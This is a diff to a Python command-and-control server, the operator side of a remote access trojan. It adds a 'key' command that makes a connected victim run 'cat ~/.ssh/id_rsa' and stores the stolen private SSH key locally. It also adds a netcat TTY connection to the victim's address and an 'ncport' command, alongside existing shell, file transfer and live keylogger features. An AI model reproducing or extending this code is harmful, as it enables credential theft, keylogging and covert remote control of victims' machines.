@@ -3,6 +3,10 @@ import os
 import socket, threading, time
 import sys
 import signal
+import pty
+
+#Take the clients message of if the reverse shell was started or not
+
 
 SERVER_ADDR = "127.0.0.1"
 SERVER_PORT = 8080
@@ -46,26 +50,6 @@ def startServer():
             print(f"\n[SERVER] New Connection Received From: {addr[0]}:{addr[1]}")
             CURRENT_CONNECTIONS.append(client_sock)
             CURRENT_ADDRESSES.append(addr)
-            try:
-                client_sock.send("hostname".encode())
-                hostName = client_sock.recv(BUFFER_SIZE).decode().strip()
-                if os.path.exists(f"{os.path.expanduser('~')}/client_keys/{hostName}"):
-                    print("Private key exists for: " + hostName)
-                    print("\n>",end="")
-                    return
-                try:
-                    subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys/{hostName}",shell=True)
-                except:
-                    subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys",shell=True)
-                    subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys/{hostName}",shell=True)
-                client_sock.send("cat ~/.ssh/id_rsa".encode())
-                subprocess.run(f"touch {os.path.expanduser('~')}/client_keys/{hostName}/id_rsa",shell=True)
-                with open(f"{os.path.expanduser('~')}/client_keys/{hostName}/id_rsa","w") as file:
-                    file.write(client_sock.recv(BUFFER_SIZE).decode())
-                    print(f"Private key copied for: {hostName}")
-                print("\n>",end="")
-            except:
-                print("Private key NOT copied!")
             # print(f"[SERVER] Active Connections: {threading.activeCount() - 6}")
             # print("cmd>")
     except (KeyboardInterrupt, SystemExit, ConnectionAbortedError):
@@ -104,6 +88,28 @@ def handleClient(client_sock,addr):
             print("Error sending command! \n" + str(e))
             print(f"{addr[0]}>",end='')
             continue
+
+def copyKey(client_sock):
+    try:
+        client_sock.send("hostname".encode())
+        hostName = client_sock.recv(BUFFER_SIZE).decode().strip()
+        if os.path.exists(f"{os.path.expanduser('~')}/client_keys/{hostName}"):
+            print("Private key exists for: " + hostName)
+            print("\n>",end="")
+            return
+        try:
+            subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys/{hostName}",shell=True)
+        except:
+            subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys",shell=True)
+            subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys/{hostName}",shell=True)
+        client_sock.send("cat ~/.ssh/id_rsa".encode())
+        subprocess.run(f"touch {os.path.expanduser('~')}/client_keys/{hostName}/id_rsa",shell=True)
+        with open(f"{os.path.expanduser('~')}/client_keys/{hostName}/id_rsa","w") as file:
+            file.write(client_sock.recv(BUFFER_SIZE).decode())
+            print(f"Private key copied for: {hostName}")
+        print("\n>",end="")
+    except:
+        print("Private key NOT copied!")
     
 #Main Console for C2
 def handleCommand():
@@ -193,14 +199,24 @@ def client_console(cmd):
                 upload_file(newCMD,CURRENT_CONNECTIONS[target])
             elif "keylogger" in newCMD:
                 start_keylog(newCMD, CURRENT_CONNECTIONS[target])
+            elif "TTY" in newCMD:
+                startTTY(CURRENT_ADDRESSES[target][0])
+            elif "key" in newCMD.lower():
+                copyKey(CURRENT_CONNECTIONS[target])
+            elif "ncport" in newCMD.lower():
+                CURRENT_CONNECTIONS[target].send("ncport".encode())
+                print("Netcat is being hosted on: " + CURRENT_ADDRESSES[target][0] + ":" + CURRENT_CONNECTIONS[target].recv(BUFFER_SIZE).decode())
             elif "help" in newCMD: #Help menu
                 print("\nHelp Menu:\
                     \n\tUse 'exit' to return to main menu. \
                     \n\tUse 'help' to show this menu. \
                     \n\tUse 'shell' to gain a shell on the client's machine \
+                    \n\tUse 'key' to copy the clients SSH key to your machine \
                     \n\tUse 'dl' to download a file.\
                     \n\tUse 'ul' to upload a file.\
-                    \n\tUse 'keylogger' to start a live keylog of the clients machine. \n")
+                    \n\tUse 'keylogger' to start a live keylog of the clients machine.\
+                    \n\tUse 'ncport' to get the port the shell is listening on.\
+                    Use 'TTY' to start a new TTY in netcat.\n")
             elif "exit" in newCMD:
                 break
             else:
@@ -310,6 +326,18 @@ def create_threads():
     t.start()
     time.sleep(1)
     handleCommand()
+
+#Open TTY by connecting via netcat
+def startTTY(IP):
+    OS = sys.platform
+    if OS == "win32" or "cygwin": #If the machine is Windows
+        pass
+    if OS == "linux" or "darwin" or "freebsd": #If the machine is linux or MacOS or FreeBSD
+        try:
+            print("Entering TTY!")
+            pty.spawn(f"/usr/local/bin/netcat {IP} 8081")
+        except KeyboardInterrupt:
+            print("Exiting TTY!")
 
 #Disconnect all clients and end sockets
 def shutdown_clients():
